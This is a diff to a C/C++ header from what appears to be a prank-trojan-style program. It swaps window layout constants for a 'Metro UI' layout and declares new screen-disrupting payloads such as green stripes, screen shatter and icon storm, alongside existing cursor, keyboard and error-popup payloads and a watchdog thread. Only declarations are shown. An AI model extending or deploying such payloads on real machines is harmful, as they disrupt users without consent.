@@ -3,19 +3,22 @@
 #define CLEAN
 
 #ifdef CLEAN
-// XP styles and DPI awareness are now handled via app.manifest + resource.rc
-
-// Window attributes
-#define BTNWIDTH 200
-#define BTNHEIGHT 30
-#define COLUMNS 2
-#define ROWS nPayloads/COLUMNS
-#define SPACE 10
-#define STARTALL_HEIGHT 36
-#define COMBO_HEIGHT 24
-#define LABEL_HEIGHT 16
-#define WINDOWWIDTH COLUMNS * BTNWIDTH + (COLUMNS + 1)*SPACE
-#define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 32 + STARTALL_HEIGHT + SPACE + LABEL_HEIGHT + COMBO_HEIGHT + SPACE*2
+// Metro UI layout — computed at runtime in main()
+extern int M_ROWS;
+extern int M_WINH;
+#define M_COLS   2
+#define M_BTNW   210
+#define M_BTNH   36
+#define M_SP     8
+#define M_TITLEH 52
+#define M_STARTALLH 40
+#define M_COMBOH 28
+#define M_LABELH 18
+#define M_STATUSH 56
+#define M_WINW   (M_COLS * M_BTNW + (M_COLS+1) * M_SP)
+// Legacy aliases used by payloads.cpp
+#define WINDOWWIDTH  M_WINW
+#define WINDOWHEIGHT M_WINH
 #endif
 
 #pragma once
@@ -50,8 +53,10 @@ DWORD WINAPI watchdogThread(LPVOID);
 DWORD WINAPI keyboardThread(LPVOID lParam);
 extern BOOLEAN enablePayloads;
 BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
+void closeAllPopups();
 #endif
 
+// ── Original payloads ────────────────────────────────────────────────────────
 int payloadExecute(PAYLOADFUNC);
 int payloadCursor(PAYLOADFUNC);
 int payloadBlink(PAYLOADFUNC);
@@ -66,12 +71,25 @@ int payloadKeyboard(PAYLOADFUNC);
 int payloadPIP(PAYLOADFUNC);
 int payloadDrawErrors(PAYLOADFUNC);
 
+// ── Suierku-style new payloads ───────────────────────────────────────────────
+int payloadGreenStripes(PAYLOADFUNC);   // 苏尔克绿色横纹
+int payloadScreenJump(PAYLOADFUNC);     // 屏幕跳动/滚动
+int payloadScanCorrupt(PAYLOADFUNC);    // 扫描线腐蚀
+int payloadIconStorm(PAYLOADFUNC);      // 图标风暴
+int payloadGlitchBlocks(PAYLOADFUNC);   // 数字故障块
+int payloadColorInvert(PAYLOADFUNC);    // 区域彩色反转
+int payloadTextRain(PAYLOADFUNC);       // 数字雨幕
+int payloadScreenShatter(PAYLOADFUNC);  // 屏幕碎裂
+
 // Target screen: virtual screen coordinates (for window positioning / msgbox)
 extern int scrx, scry, scrw, scrh;
 
-// Per-monitor DC: uses the monitor's own device name so coordinates are
-// always (0,0) = top-left of that monitor, regardless of DPI or position.
-// srcx/srcy are the virtual-screen offsets used only for window placement.
+// Global intensity ramp
+void  initGlobalIntensity();
+float gIntensity();
+float payloadStrength(int times, int runtime);
+
+// Per-monitor DC
 HDC getTargetDC();
 void releaseTargetDC(HDC hdc);
 
